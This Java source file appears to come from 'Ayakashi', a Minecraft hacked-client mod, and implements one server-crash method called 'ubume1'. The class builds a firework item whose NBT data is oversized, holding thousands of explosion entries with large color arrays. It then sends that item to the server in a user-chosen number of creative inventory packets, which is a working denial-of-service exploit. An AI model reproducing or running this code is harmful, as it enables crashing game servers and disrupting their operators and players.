package Ayakashi.methods.impl;

import Ayakashi.helpers.ChatHelper;
import Ayakashi.methods.Crash;
import Ayakashi.methods.CrashInfo;
import Ayakashi.mods.notifications.Notification;
import Ayakashi.mods.notifications.NotificationManager;
import Ayakashi.mods.notifications.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

import java.util.Arrays;

@CrashInfo(
        name = "ubume1"
)
public class CrashUbume1 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Ayakashi"), "Ubume method started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));

        (new Thread(() -> {
            try {
                ItemStack firework = new ItemStack(Items.fireworks);
                NBTTagCompound tagf = new NBTTagCompound();
                NBTTagCompound tage = new NBTTagCompound();
                NBTTagList list = new NBTTagList();
                int[] i = new int[64];

                int i3;
                for (i3 = 0; i3 < 3260; ++i3) {
                    Arrays.fill(i, i3 + 1);
                    NBTTagCompound tagx = new NBTTagCompound();
                    tagx.setIntArray("Colors", i);
                    list.appendTag(tagx);
                }

                tage.setTag("Explosions", list);
                tage.setByte("Flight", (byte) 2);
                tagf.setTag("Fireworks", tage);
                firework.setTagCompound(tagf);
                for (int i2 = 0; i2 < packets; ++i2) {
                    Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(3, firework));
                }
            } catch (Exception ignored) {
            }
        })).start();
        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}
